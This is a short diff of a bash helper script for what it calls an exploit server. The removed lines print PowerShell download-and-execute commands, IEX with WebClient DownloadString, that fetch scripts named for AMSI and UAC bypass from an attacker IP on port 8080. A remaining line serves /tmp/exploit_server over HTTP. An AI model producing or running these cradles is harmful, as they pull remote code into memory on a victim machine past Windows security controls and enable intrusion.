@@ -55,21 +55,5 @@ print_command() {
     echo -e "${BLUE}$1${NC}"
     echo "----------------------------------------"
 }
-
-# Print PowerShell bypass commands
-echo "PowerShell Bypass Commands:"
-echo "============================"
-
-for script in pu-explorer.ps1 wp-explorer.ps1 pn-explorer.ps1 uac-explorer.ps1 amsi-explorer.ps1; do
-    url="http://$IP:8080/$script"
-    echo "Commands for $script:"
-    echo "--------------------"
-    
-    # Method 1: Standard IEX with WebClient
-    print_command IEX((New-Object Net.WebClient).DownloadString('$url'))"
-    echo
-done
-
-
 # Start the web server
 python3 -m http.server 8080 -d /tmp/exploit_server
